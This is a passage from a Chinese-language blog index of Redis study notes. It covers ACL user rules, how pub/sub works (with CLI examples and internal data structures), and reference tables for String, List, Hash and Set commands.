------------------------------------------------------------ |\n  | &<pattern>    | (版本`6.2`之后) 添加用户可以访问的 `Pub/Sub` 通道的全局样式模式。可以指定多个通道模式。<br />注意：模式匹配只对`PUBLISH`和`SUBSCRIBE`提到的通道进行, 而`PSUBSCRIBE`要求它的通道模式和用户允许的通道模式之间的文字匹配 |\n  | allchannels   | `&*`另外一种书写形式，允许用户访问所有Pub/Sub通道。          |\n  | resetchannels | 刷新允许的通道模式列表，如果用户的发布/订阅客户端不再能够访问各自的通道 和/或 通道模式，则断开这些客户端。 |\n\n- 为用户配置有效密码\n\n  如果一个用户没有标记为nopass，并且没有有效密码列表，那么该用户实际上是不可能使用的，因为无法以该用户身份登录\n\n  | 参数 | 说明 |\n  | ---- | ---- |\n  |><password>| 将此密码添加到用户的有效密码列表中。例如，`>mypass`会将`mypass`添加到有效密码列表中。<br />该指令清除`nopass`标志(参见后面的内容)。每个用户可以有任意数量的密码。 |\n  | <<password>| 从有效密码列表中删除此密码。如果您试图删除的密码实际上没有设置，则会发出一个错误。 |\n  | #<hash>| 将此SHA-256哈希值添加到用户的有效密码列表中。<br />此哈希值将与为ACL用户输入的密码的哈希值进行比较。这允许用户在acl.conf文件中存储哈希值，而不是存储明文密码。<br />只有SHA-256哈希值被接受，因为密码哈希值必须是64个字符，并且只包含小写的十六进制字符。 |\n  | !<hash>| 从有效密码列表中删除此散列值。<br />当您不知道由哈希值指定的密码，但希望从用户中删除密码时，这很有用。 |\n  | nopass| 该用户设置的所有密码都被删除，并且该用户被标记为不需要密码：这意味着每个密码都适用于该用户。<br />如果此指令用于默认用户`default`，则每个新连接将立即使用默认用户进行身份验证，而不需要任何显式的`AUTH`命令。<br />注意，resetpass 指令将清除此条件。 |\n  | resetpass| 清除允许的密码列表并删除`nopass`状态。<br />在`resetpass`之后，用户没有关联的密码，如果不添加一些密码（或者稍后将其设置为nopass）就无法进行身份验证。 |\n\n\n\n\n\n- 为用户配置选择器\n\n  | 参数           | 说明                                                         |\n  | -------------- | ------------------------------------------------------------ |\n  | (<rule list>)  | (版本`7.0`之后) 创建一个新的选择器来匹配规则。<br />用括号中指定的选项创建一个新的选择器，并将其附加到用户。每个选项应该用空格隔开。第一个字符必须是`(`最后一个字符必须是`)`<br />选择器在用户权限之后计算，并根据它们定义的顺序计算。如果一个命令匹配用户权限或任何选择器，它就被允许。<br />去 [selectors](https://redis.io/docs/management/security/acl/#selectors) 查看更多信息 |\n  | clearselectors | (版本`7.0`之后) 删除所有附加到用户的选择器                   |\n  |                |                                                              |\n\n- 重置用户:\n\n  | 参数  | 说明                                                         |\n  | ----- | ------------------------------------------------------------ |\n  | reset | 执行以下操作:`resetpass, resetkeys, resetchannels, allchannels(如果设置了acl-pubsub-default)， off, clearselectors， -@all`<br />用户将返回到创建后立即具有的相同状态。 |\n\n\n\n# 命令分类\n\n| 参数 | 说明 |\n| ---- | ---- |\n| admin | 管理命令。普通应用程序永远不需要使用这些. <br />Includes REPLICAOF, CONFIG, DEBUG, SAVE, MONITOR, ACL, SHUTDOWN, etc. |\n| blocking | 可能阻塞连接，直到另一个命令释放 |\n| connection | 影响连接或其他连接的命令. 包含 AUTH, SELECT, COMMAND, CLIENT, ECHO, PING, 等 |\n| dangerous | 有潜在危险(由于各种原因，每一种都应谨慎考虑). 包含 FLUSHALL, MIGRATE, RESTORE, SORT, KEYS, CLIENT, DEBUG, INFO, CONFIG, SAVE, REPLICAOF, 等 |\n| fast | Fast O(1) 命令. 可以循环参数的数量，但不是键中的元素数量。 |\n| keyspace | 以类型不可知的方式从键、数据库或其元数据中写入或读取。包括DEL, RESTORE, DUMP, RENAME, EXISTS, DBSIZE, KEYS, EXPIRE, TTL, FLUSHALL等。<br />可能修改键空间、键或元数据的命令也将有`写`类别<br />只读取键空间、键或元数据的命令将具有`read`类别 |\n| pubsub | PubSub相关命令 |\n| read | 从键(值或元数据)读取。注意，不与键交互的命令既不能读也不能写。 |\n| scripting | Scripting相关命令 |\n| slow | 所有不是快速的命令. |\n| transaction | WATCH / MULTI / EXEC 相关命令 |\n| write | 写入键(值或元数据)。 |\n| bitmap | Data type: bitmaps related. |\n| set | Data type: sets related. |\n| sortedset | Data type: sorted sets related. |\n| geo | Data type: geospatial indexes related. |\n| hash | Data type: hashes related. |\n| hyperloglog | Data type: hyperloglog related. |\n| stream | Data type: streams related. |\n| string | Data type: strings related. |\n| list | Data type: lists related. |\n\n有关ACL配置的更多信息，请参见 https://redis.io/topics/acl\n","tags":["Redis"],"categories":["数据库","Redis"]},{"title":"Redis-发布订阅","url":"/20250619/4cdb4706.html","content":"\n# Redis  发布订阅简介\n\n> Redis 发布订阅(pub/sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。\n\nRedis 的 SUBSCRIBE 命令可以让客户端订阅任意数量的频道， 每当有新信息发送到被订阅的频道时， 信息就会被发送给所有订阅指定频道的客户端。\n\n作为例子， 下图展示了频道 channel1 ， 以及订阅这个频道的三个客户端 —— client2 、 client5 和 client1 之间的关系：\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-1.svg) \n\n当有新消息通过 PUBLISH 命令发送给频道 channel1 时， 这个消息就会被发送给订阅它的三个客户端：\n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-2.svg) \n\n## 发布/订阅使用\n\n> Redis有两种发布/订阅模式：\n>\n> - 基于频道(Channel)的发布/订阅\n> - 基于模式(pattern)的发布/订阅\n\n### 基于频道(Channel)的发布/订阅\n\n\"发布/订阅\"模式包含两种角色，分别是发布者和订阅者。发布者可以向指定的频道(channel)发送消息; 订阅者可以订阅一个或者多个频道(channel),所有订阅此频道的订阅者都会收到此消息。 \n\n![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-8.png) \n\n- **发布者发布消息**\n\n  发布者发布消息的命令是 `publish`,用法是` publish channel message`，如向 channel1.1说一声hi\n\n  ```bash\n  127.0.0.1:6379> publish channel:1 hi\n  (integer) 1\n  ```\n\n  这样消息就发出去了。返回值表示接收这条消息的订阅者数量。发出去的消息不会被持久化，也就是有客户端订阅channel:1后只能接收到后续发布到该频道的消息，之前的就接收不到了。\n\n- **订阅者订阅频道**\n\n  订阅频道的命令是 `subscribe`，可以同时订阅多个频道，用法是 `subscribe channel1 [channel2 ...]`,例如新开一个客户端订阅上面频道:(不会收到消息，因为不会收到订阅之前就发布到该频道的消息)\n\n  ```bash\n  127.0.0.1:6379> subscribe channel:1\n  Reading messages... (press Ctrl-C to quit)\n  1) \"subscribe\" // 消息类型\n  2) \"channel:1\" // 频道\n  3) \"hi\" // 消息内容\n  ```\n\n  执行上面命令客户端会进入订阅状态，处于此状态下客户端不能使用除`subscribe`、`unsubscribe`、`psubscribe`和`punsubscribe`这四个属于\"发布/订阅\"之外的命令，否则会报错。\n\n  进入订阅状态后客户端可能收到3种类型的回复。每种类型的回复都包含3个值，第一个值是消息的类型，根据消类型的不同，第二个和第三个参数的含义可能不同。\n\n  消息类型的取值可能是以下3个:\n\n  - **subscribe**。表示订阅成功的反馈信息。第二个值是订阅成功的频道名称，第三个是当前客户端订阅的频道数量。\n  - **message**。表示接收到的消息，第二个值表示产生消息的频道名称，第三个值是消息的内容。\n  - **unsubscribe**。表示成功取消订阅某个频道。第二个值是对应的频道名称，第三个值是当前客户端订阅的频道数量，当此值为0时客户端会退出订阅状态，之后就可以执行其他非\"发布/订阅\"模式的命令了。\n\n  | **消息发布者**                                 | **订阅者A**                                                  | **订阅者B**                                                  |\n  | ---------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n  | > PUBLISH channel:a hi <br />(integer) 0       | > SUBSCRIBE channel:a channel:b <br />1) \"subscribe\" <br />2) \"channel:a\"<br /> 3) (integer) 1 <br />1) \"subscribe\" <br />2) \"channel:b\" <br />3) (integer) 2 | > SUBSCRIBE channel:b channel:c <br />1) \"subscribe\" <br />2) \"channel:b\" <br />3) (integer) 1 <br />1) \"subscribe\" <br />2) \"channel:c\" <br />3) (integer) 2 |\n  | > PUBLISH channel:a hi <br />(integer) 1       | 1) \"message\" <br />2) \"channel:a\" <br />3) \"hi\"              |                                                              |\n  | > PUBLISH channel:b hello <br />(integer) 2    | 1) \"message\" <br />2) \"channel:b\" <br />3) \"hello\"           | 1) \"message\"<br />2) \"channel:b\"<br />3) \"hello\"             |\n  | > PUBLISH channel:c lalalala <br />(integer) 1 |                                                              | 1) \"message\"<br />2) \"channel:c\" <br />3) \"lalalala\"         |\n\n\n\n### 基于模式(pattern)的发布/订阅\n\n如果有某个/某些模式和这个频道匹配的话，那么所有订阅这个/这些频道的客户端也同样会收到信息。\n\n- **用图例解释什么是基于模式的发布订阅**\n\n  下图展示了一个带有频道和模式的例子， 其中 `tweet.shop.*` 模式匹配了 `tweet.shop.kindle` 频道和 `tweet.shop.ipad` 频道， 并且有不同的客户端分别订阅它们三个：\n\n   ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-5.svg)\n\n  当有信息发送到` tweet.shop.kindle` 频道时， 信息除了发送给 clientX 和 clientY 之外， 还会发送给订阅` tweet.shop.* `模式的 client123 和 client256 ：\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-6.svg) \n\n  另一方面， 如果接收到信息的是频道 `tweet.shop.ipad` ， 那么 client123 和 client256 同样会收到信息：\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-7.svg) \n\n- **基于模式的例子**\n\n  通配符中`?`表示1个占位符，`*`表示任意个占位符(包括0)，`?*`表示1个以上占位符。\n\n  |          | **消息发布者**                     | **订阅者A**                                                  |                                                              |\n  | -------- | ---------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n  | 准备     |                                    | > **psubscribe a? b\\* d?\\*** <br />1) \"psubscribe\"  <br />2) \"a?\"  <br />3) (integer) 1  <br />1) \"psubscribe\"  <br />2) \"b\" 3) (integer) 2  <br />1) \"psubscribe\"  <br />2) \"d?\"  <br />3) (integer) 3 <br /> | > **psubscribe c? b\\* d?\\*** <br />\"psubscribe\"  <br />2) \"c?\"  <br />3) (integer) 1  <br />1) \"psubscribe\"  <br />2) \"b\" 3) (integer) 2  <br />1) \"psubscribe\"  <br />2) \"d?\"  <br />3) (integer) 3 |\n  | 发送消息 | > publish a m1<br /> (integer) 0   |                                                              |                                                              |\n  | 发送消息 | > publish a1 m1<br /> (integer) 1  | 1) \"pmessage\"<br />2) \"a?\"<br />3) \"a1\"<br />4) \"m1\"         |                                                              |\n  | 发送消息 | > publish a11 m1 <br />(integer) 0 |                                                              |                                                              |\n  | 发送消息 | > publish b abc <br />(integer) 2  | 1) \"pmessage\" <br />2) \"b*\" <br />3) \"b\" <br />4) \"abc\"      | 1) \"pmessage\" <br />2) \"b*\" <br />3) \"b\" <br />4) \"abc\"      |\n  | 发送消息 | > publish c abc<br /> (integer) 0  |                                                              |                                                              |\n  | 发送消息 | > publish c1 m1<br /> (integer) 1  |                                                              | 1) \"pmessage\" <br />2) \"c?\" <br />3) \"c1\" <br />4) \"m1\"      |\n  | 发送消息 | > publish c11 m1 <br />(integer) 0 |                                                              |                                                              |\n  | 发送消息 | > publish d m1 <br />(integer) 0   |                                                              |                                                              |\n  | 发送消息 | > publish d1 m1 <br />(integer) 2  | 1) \"pmessage\" <br />2) \"d?*\" <br />3) \"d1\" <br />4) \"m1\"     | 1) \"pmessage\" <br />2) \"d?*\" <br />3) \"d1\" <br />4) \"m1\"     |\n  | 发送消息 | > publish d11 m1<br /> (integer) 2 | 1) \"pmessage\" <br />2) \"d?*\" <br />3) \"d11\" <br />4) \"m1\"    | 1) \"pmessage\" <br />2) \"d?*\" <br />3) \"d11\" <br />4) \"m1\"    |\n\n- **注意点**\n\n1. 使用`psubscribe`命令可以重复订阅同一个频道，如客户端执行了`psubscribe c? c?*`。这时向c1发布消息客户端会接受到两条消息，而同时`publish`命令的返回值是2而不是1。同样的，如果有另一个客户端执行了`subscribe c1` 和`psubscribe c?*`的话，向c1发送一条消息该客户顿也会受到两条消息(但是是两种类型:message和pmessage)，同时`publish`命令也返回2.\n\n2. `punsubscribe`命令可以退订指定的规则，用法是: `punsubscribe [pattern [pattern ...]]`,如果没有参数则会退订所有规则。\n\n3. 使用`punsubscribe`只能退订通过psubscribe命令订阅的规则，不会影响直接通过`subscribe`命令订阅的频道；同样`unsubscribe`命令也不会影响通过`psubscribe`命令订阅的规则。另外需要注意`punsubscribe`命令退订某个规则时不会将其中的通配符展开，而是进行严格的字符串匹配，所以`punsubscribe *` 无法退订`c*`规则，而是必须使用`punsubscribe c*`才可以退订。（它们是相互独立的，后文可以看到数据结构上看也是两种实现）\n\n## 深入理解\n\n> 我们通过几个问题，来深入理解Redis的订阅发布机制\n\n### 基于频道(Channel)的发布/订阅如何实现的？\n\n底层是通过字典（图中的pubsub_channels）实现的，这个字典就用于保存订阅频道的信息：字典的键为正在被订阅的频道， 而字典的值则是一个链表， 链表中保存了所有订阅这个频道的客户端。\n\n- **数据结构**\n\n  比如说，在下图展示的这个 pubsub_channels 示例中， client2 、 client5 和 client1 就订阅了 channel1 ， 而其他频道也分别被别的客户端所订阅：\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-3.svg) \n\n- **订阅**\n\n  当客户端调用 SUBSCRIBE 命令时， 程序就将客户端和要订阅的频道在 pubsub_channels 字典中关联起来。\n\n  举个例子，如果客户端 client10086 执行命令 `SUBSCRIBE channel1 channel2 channel3` ，那么前面展示的 pubsub_channels 将变成下面这个样子：\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-4.svg) \n\n- **发布**\n\n  当调用 `PUBLISH channel message` 命令， 程序首先根据 channel 定位到字典的键， 然后将信息发送给字典值链表中的所有客户端。\n\n  比如说，对于以下这个 pubsub_channels 实例， 如果某个客户端执行命令 `PUBLISH channel1 \"hello moto\"` ，那么 client2 、 client5 和 client1 三个客户端都将接收到 \"hello moto\" 信息：\n\n- **退订**\n\n  使用 UNSUBSCRIBE 命令可以退订指定的频道， 这个命令执行的是订阅的反操作： 它从 `pubsub_channels `字典的给定频道（键）中， 删除关于当前客户端的信息， 这样被退订频道的信息就不会再发送给这个客户端。\n\n### 基于模式(Pattern)的发布/订阅如何实现的？\n\n底层是pubsubPattern节点的链表。\n\n- **数据结构** \n\n  redisServer.pubsub_patterns 属性是一个链表，链表中保存着所有和模式相关的信息：\n\n  ```c\n  struct redisServer {\n      // ...\n      list *pubsub_patterns;\n      // ...\n  };\n  ```\n\n  链表中的每个节点都包含一个 redis.h/pubsubPattern 结构：\n\n  ```c\n  typedef struct pubsubPattern {\n      redisClient *client;\n      robj *pattern;\n  } pubsubPattern;\n  ```\n\n  client 属性保存着订阅模式的客户端，而 pattern 属性则保存着被订阅的模式。\n\n  每当调用 PSUBSCRIBE 命令订阅一个模式时， 程序就创建一个包含客户端信息和被订阅模式的 pubsubPattern 结构， 并将该结构添加到 redisServer.pubsub_patterns 链表中。\n\n  作为例子，下图展示了一个包含两个模式的 pubsub_patterns 链表， 其中 client123 和 client256 都正在订阅 tweet.shop.* 模式：\n\n  !\n\n  ](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-9.svg) \n\n- **订阅**\n\n  如果这时客户端 client10086 执行 `PSUBSCRIBE broadcast.list.*` ， 那么 pubsub_patterns 链表将被更新成这样：\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-10.svg) \n\n  通过遍历整个 pubsub_patterns 链表，程序可以检查所有正在被订阅的模式，以及订阅这些模式的客户端。\n\n- **发布**\n\n  发送信息到模式的工作也是由 PUBLISH 命令进行的, 显然就是匹配模式获得Channels，然后再把消息发给客户端。\n\n- **退订**\n\n  使用 PUNSUBSCRIBE 命令可以退订指定的模式， 这个命令执行的是订阅模式的反操作： 程序会删除 redisServer.pubsub_patterns 链表中， 所有和被退订模式相关联的 pubsubPattern 结构， 这样客户端就不会再收到和模式相匹配的频道发来的信息。\n\n## SpringBoot结合Redis发布/订阅实例？\n\n参考：https://blog.csdn.net/llll234/article/details/80966952\n\n最佳实践是通过RedisTemplate，关键代码如下：\n\n```java\n// 发布\nredisTemplate.convertAndSend(\"my_topic_name\", \"message_content\");\n\n// 配置订阅\nRedisMessageListenerContainer container = new RedisMessageListenerContainer();\ncontainer.setConnectionFactory(connectionFactory);\ncontainer.addMessageListener(xxxMessageListenerAdapter, \"my_topic_name\");\n```\n\n------\n\n \n","tags":["Redis"],"categories":["数据库","Redis"]},{"title":"Redis-命令记录","url":"/20250619/709af9d4.html","content":"\n#  KEY的命名\n\n用`:`分隔不同的层次命名空间，如：`user:id12345:contact`\n\n如果某个对象有`字段的字段`，用`.`连接。如`user:id12345:contact.mail`。\n\n# 基础命令记录\n\n| 命令   | 使用                                                         | 说明                           |\n| :----- | :----------------------------------------------------------- | ------------------------------ |\n| SWAPDB | <span id=\"Order_SWAPDB\">**SWAPDB** index1 index2 </span>     | 库index1 和 库index2的数据交换 |\n| EXISTS | <span id=\"Order_EXISTS\">**EXISTS** key</span>                | 判断key是否存在                |\n| TTL    | <span id=\"Order_TTL\">**TTL** key</span>                      | 查询key的过期时间              |\n| EXPIRE | <span id=\"Order_EXPIRE\">**EXPIRE** key seconds  /  **EXPIREAT** key timestamp</span> |                                |\n\n","tags":["Redis"],"categories":["数据库","Redis"]},{"title":"Redis-数据类型（基础）","url":"/20250619/72ab10c8.html","content":"\n# String\n\n|命令|使用|功能|说明|\n|:-|:-|:-|--|\n|SET|SET *key* value <br />SET *key* value ex seconds|增|储值<br />储值且key在指定秒后过期|\n|MSET|MSET *key* value [key value ...]|增|同时储多个值|\n|SETEX|SETEX *key* seconds value|增|储值，且key在指定秒后过期|\n|PSETEX|PSETEX *key* milliseconds value|增|储值，且key在指定毫秒后过期|\n|SETNX|SETNX *key* value|增|仅在key不存在时执行|\n|MSETNX|MSETNX *key* value [key value ...]|增|在所有的key不存在时执行|\n|SETRANGE|SETRANGE *key* offset value|改|字符串从offset开始由value替代|\n|INCR|INCR key|改|key自增|\n|DECR|DECR key|改|key自减|\n|INCRBY|INCRBY *key* increment|改|key增加指定整形量|\n|DECRBY|DECRBY *key* decrement|改|key减少指定整形量|\n|INCRBYFLOAT|INCRBYFLOAT *key* increment|改|key增加指定浮点量，浮点数为负数则为减少|\n|APPEND|APPEND *key* value|改|追加储值|\n|GET|GET *key*|查|获取key的value|\n|MGET|MGET key [key ...]|查|同时获取多个key|\n|GETDEL|GETDEL *key*|查&删|获取key的value后删除key|\n|GETSET|GETSET *key* value|查&改|set新的value，并返回旧的value|\n|GETRANGE|GETRANGE *key* start end|查|获取value的子字符串 （从start到end）|\n|SUBSTR|SUBSTR *key* start end|查|获取value的子字符串 （从start到end）|\n|STRLEN|STRLEN key|查|获取字符串长度|\n\n> 其他（6.0.6以下版本不支持）\n\n|       | 发行版本 | 命令                                                         | 功能  | 说明                                                         |\n| ----- | -------- | ------------------------------------------------------------ | ----- | ------------------------------------------------------------ |\n| GETEX | 6.2.0    | **GETEX** key [**EX** seconds \\|**PX** milliseconds \\|**EXAT** unix-time-seconds \\|**PXAT** unix-time-milliseconds \\|**PERSIST**] | 查&删 | - **EX** seconds：指定过期秒数<br/>- **PX** milliseconds：指定过期毫秒数<br/>- **EXAT** timestamp-seconds：指定unix某时间点后多少秒过期<br/>- **PXAT** timestamp-milliseconds：指定unix某时间点后多少毫秒过期<br/>- **PERSIST**：删除过期时间 |\n| LCS   | 7.0.0    | **LCS** key1 key2 [LEN] [**IDX**] [**MINMATCHLEN** len] [**WITHMATCHLEN**] | 查    | 实现最长公共子序列算法。匹配是从最后一个key到第一个key产生的。<br /><br />[**LEN**]：最长匹配字符串长度<br />[**IDX**]：返回一个数组。其中包含 LCS匹配结果长度、两个字符串匹配上的开始和结束偏移量<br />[**MINMATCHLEN** len] ：最短匹配字符串长度<br />[**WITHMATCHLEN**]：与IDX一起使用，返回最长公共子字符串的长度 |\n\n> 详解\n\n1. <span id=\"Order_LCS\">**LCS** key1 key2 [LEN] [**IDX**] [**MINMATCHLEN** len] [**WITHMATCHLEN**] （longest contain substring）</span>\n\n   LCS 命令实现最长公共子序列算法。请注意，这与最长的常见字符串算法不同，因为字符串中的匹配字符不需要是连续的\n\n   ```sh\n   > MSET key1 ohmytext key2 mynewtext\n   OK\n   ```\n\n   a. 获取匹配结果\n\n   ```sh\n   > LCS key1 key2\n   \"mytext\"\n   ```\n\n   b. 有时我们只需要匹配的长度：LEN\n\n   ```sh\n   > LCS key1 key2 LEN\n   \"6\"\n   ```\n\n   c. 获取匹配的详细情况：IDX（LEN 和 IDX 不可同时存在）\n\n   ```sh\n   > LCS key1 key2 IDX\n   1) \"matches\"\n   2) 1) 1) 1) (integer) 4\n            2) (integer) 7\n         2) 1) (integer) 5\n            2) (integer) 8\n      2) 1) 1) (integer) 2\n            2) (integer) 3\n         2) 1) (integer) 0\n            2) (integer) 1\n   3) \"len\"\n   4) (integer) 6\n   ```\n\n   然而，通常非常有用的是知道每个字符串中的匹配位置：**匹配是从最后一个到第一个产生的**\n\n   上面的数组意味着第一个匹配项（数组的第二个元素）在第一个字符串的位置 2-3 和第二个字符串的 0-1 之间。然后是 4-7 和 5-8 之间。\n\n   要将匹配列表限制为给定最小长度的匹配列表：`MINMATCHLEN 4`\n\n   ```sh\n   > LCS key1 key2 IDX MINMATCHLEN 4\n   1) \"matches\"\n   2) 1) 1) 1) (integer) 4\n            2) (integer) 7\n         2) 1) (integer) 5\n            2) (integer) 8\n   3) \"len\"\n   4) (integer) 6\n   ```\n\n   匹配列表展示匹配长度：`WITHMATCHLEN`\n\n   ```sh\n   > LCS key1 key2 IDX MINMATCHLEN 4 WITHMATCHLEN\n   1) \"matches\"\n   2) 1) 1) 1) (integer) 4\n            2) (integer) 7\n         2) 1) (integer) 5\n            2) (integer) 8\n         3) (integer) 4\n   3) \"len\"\n   4) (integer) 6\n   ```\n\n   - 如果没有修饰符，则返回表示**最长**公共子字符串的字符串。\n\n   - 当`LEN`给出命令返回最长公共子字符串的长度。\n\n   - 当`IDX`给出该命令时，返回一个数组。\n\n     len：包含 LCS匹配结果长度\n\n     matches：两个字符串匹配上的开始和结束偏移量。当`WITHMATCHLEN`给出每个表示匹配的数组时，也将具有匹配的长度\n\n# List\n\nRedis 列表是字符串值的链表。\n\n\n\n Redis 列表经常用于：\n\n- 实现堆栈和队列。\n- 为后台工作系统构建队列管理。\n\n双向链表：LPUSH命令将一个新元素添加到列表的左侧（头部），而该RPUSH命令将一个新元素添加到列表的右侧（尾部）\n\n\n\n使用列表的技巧\n\n- lpush+lpop = Stack(栈)\n- lpush+rpop = Queue（队列）\n- lpush+ltrim = Capped Collection（有限集合）\n- lpush+brpop = Message Queue（消息队列）\n\n|命令|使用|功能|说明|\n|:-|:-|:-|--|\n|LPUSH|LPUSH *key* value [value ...]|增||\n|LPOP|LPOP key|删||\n|LPUSHX|LPUSHX *key* value [value ...]|增|当 key 不存在时不会进行任何操作|\n|LSET|LSET *key* index value|改|修改指定位置元素|\n|LINSERT|LINSERT key <BEFORE \\|AFTER> pivot element|查&增| 功能： 在参考值pivot 之前或之后，将元素插入存储在 key 处的列表中。<br />-  当key不存在时，认为是空列表，不进行任何操作。 <br />- 当key存在，但不包含值pivot 时返回错误。<br /><br />返回：  插入操作后列表的长度，或者当未找到值主元时为 -1。<br />举例：`LINSERT mylist BEFORE \"World\" \"There\"` |\n|LREM|LREM *key* count value|删|删除count个value。count 为负数，从列尾开始计算|\n|LTRIM|LTRIM *key* start stop|删|截断列表元素，-1 是列表的最后一个元素|\n|LRANGE|LRANGE *key* start stop|查|获取列表指定范围数据：偏移量为负数，表示从列表末尾开始的偏移量。 <br />正整数（正数排名），负整数（倒数排名）<br />例如，-1 是列表的最后一个元素，-2 是倒数第二个元素，依此类推。|\n|LLEN|LLEN *key*|查|获取列表元素个数|\n|LINDEX|LINDEX *key* index|查|获取列表第index个元素，-1 是列表的最后一个元素|\n|LPOS|LPOS *key* element [RANK rank] [COUNT num-matches] [MAXLEN len]|查|查找列表元素（发布版本：6.0.6） <br />[RANK rank] ： 指定要返回的第一个元素的“排名”，正整数（正数排名），负整数（倒数排名）。<br />[COUNT num-matches]：总共返回 num-matches个目标元素<br />[MAXLEN len]：最大筛查次数|\n|BLPOP|BLPOP *key [key ...]* timeout|删|它是 LPOP 的阻塞版本。<br /> 当没有任何元素可以从任何给定列表中弹出时，它会阻塞连接，直到超时后返回 null|\n|RPUSH|RPUSH *key* value [value ...]|增||\n|RPUSHX|RPUSHX *key* value [value ...]|增|当 key 不存在时不会进行任何操作|\n|RPOP|RPOP *key*|删||\n|RPOPLPUSH|RPOPLPUSH *source* *destination*|删|删除列表中的最后一个元素，将其添加到另一个列表并返回|\n|BRPOP|BRPOP *key [key ...]* timeout|删|它是 RPOP 的阻塞版本|\n\n> 其他（6.0.6以下版本不支持）\n\n| 命令   | 使用                                                         | 发行版本 | 说明                                                       |\n| ------ | ------------------------------------------------------------ | -------- | ---------------------------------------------------------- |\n| LMOVE  | **LMOVE** *source  destination* **LEFT \\|RIGHT   LEFT\\|RIGHT** | 6.2.0    | 从列表中弹出一个元素，将其推送到另一个列表并返             |\n| LMPOP  | **LMPOP** numkeys *key [key ...]* <**LEFT \\|RIGHT**> [**COUNT** count] | 7.0.0    | 从提供的键名列表中的第一个非空列表键中弹出一个或多个元素。 |\n| BLMPOP | **BLMPOP** timeout numkeys *key [key ...]* <**LEFT \\|RIGHT**> [**COUNT** count] | 7.0.0    | 它是 LMPOP 的阻塞版本                                      |\n| BLMOVE | **BLMOVE**  *source  destination* <**LEFT \\|RIGHT**> <**LEFT \\|RIGHT**> timeout | 6.2.0    | 它是 LMOVE 的阻塞版本                                      |\n\n# Hash\n\nRedis 哈希是结构为字段值对集合的记录类型。您可以使用散列来表示基本对象并存储计数器分组等。\n\n| 命令 | 使用 | 功能 | 说明 |\n| :- | :- | :- | -- |\n| HEXISTS | HEXISTS *key* field | 查 | 查询 key.field 是否存在，存在返回0，不存在返回1 |\n| HGET | HGET *key* field | 查 | 获取指定键值对 |\n| HMGET | HMGET *key* field [field ...] | 查 | 获取多个字段值 |\n| HGETALL | HGETALL *key* | 查 | 获取所有键值对数据 |\n| HINCRBY | HINCRBY *key* field increment | 改 | 将hash 的 field字段的整数值增加给定的数字 |\n| HINCRBYFLOAT | HINCRBYFLOAT *key* field increment | 改 | 将hash 的 field字段的浮点值增加给定的数量 |\n| HKEYS | HKEYS *key* | 查 | 获取hash 中的所有key |\n| HLEN | HLEN *key* | 查 | 键值对个数 |\n| HSET | HSET *key* field value | 增 |  |\n| HMSET | HMSET *key* field value [field value...] | 增 |  |\n| HSETNX | HSETNX *key* field value [field value...] | 增 | 如果 key field 都已存在时不会进行任何操作 |\n| HSTRLEN | HSTRLEN *key* field | 查 | 获取 key.field的value的长度 |\n| HVALS | HVALS *key* | 查 | 获取hash 中的所有value |\n| HSCAN | HSCAN *key* cursor [MATCH pattern] [COUNT count] | 查 | 使用方法方法可以参考[SCAN](#Order_SCAN) |\n| HDEL | HDEL *key* field [field ...] | 删 | 删除一个或者多个Hash表的键值对 |\n\n> 其他（6.0.6以下版本不支持）\n\n| 命令       | 发行版本 | 使用                                        | 功能 | 说明                                                         |\n| ---------- | -------- | ------------------------------------------- | ---- | ------------------------------------------------------------ |\n| HRANDFIELD | 6.2.0    | **HRANDFIELD** key [count [**WITHVALUES**]] | 查   | 从哈希中获取一个或多个随机字段<br />[**WITHVALUES**]：返回结果包含value |\n\n实战场景\n\n- 缓存：相比String更节省空间，能直观的维护缓存信息，如用户信息，视频信息等。\n\n#  Set：无序集合\n\nRedis 集是唯一字符串（成员）的无序集合。您可以使用 Redis 集高效地：\n\n- 跟踪唯一项目（例如，跟踪访问给定博客文章的所有唯一 IP 地址）\n- 表示关系（例如，具有给定角色的所有用户的集合）\n- 执行常见的集合运算，例如交集、并集和差集\n\n\n\n**实战场景**\n\n- **标签**（tag）,给用户添加标签，或者用户给消息添加标签，这样有同一标签或者类似标签的可以给推荐关注的事或者关注的人。\n- **点赞，或点踩，收藏等**，可以放到set中实现\n\n| 命令 | 使用 | 功能 | 说明 |\n| :- | :- | :- | :- |\n| SADD | SADD *key* member [member ...] | 增 | 向集合中添加一个或多个成员 |\n| SCARD | SCARD *key* | 查 | 集合中元素个数 |\n| SDIFF | SDIFF *key [key ...]* | 集合：补 | 取多个集合的差分（其他集合中都没有的元素） |\n| SDIFFSTORE | SDIFFSTORE *destination* *key [key ...]* | 集合：补&存 | 取多个集合的差分, 并将结果集存储在一个集合中 |\n| SINTER | SINTER *key [key ...]* | 集合：交 | 取多个集合的交集并返回 <br />INTER 为 Intersect /ˌɪntəˈsekt/ 的缩写 |\n| SINTERSTORE | SINTERSTORE *destination* *key [key ...]* | 集合：交&存 | 取多个集合的交集并将结果集存储在一个集合中（destination） |\n| SISMEMBER | SISMEMBER *key* member | 查 | 检查一个元素是否存在 |\n| SMEMBERS | SMEMBERS *key* | 查 | 返回所有元素 |\n| SMOVE | SMOVE *source destination* member | 查&移动 | 将集合source 中的元素member移动到集合destination中 |\n| SPOP | SPOP key [count] | 查&删 | 从集合中移除并返回一个或多个（count）随机成员 |\n| SRANDMEMBER | SRANDMEMBER key [count] | 查 | 从集合中获取一个或多个（count）随机成员，元素在集合中依然存在 |\n| SREM | SREM *key* member [member ...] | 删 | 从SET中删除一个或者多个元素 |\n| SUNION | SUNION *key [key ...]* | 集合：并 | 取多个集合的并集 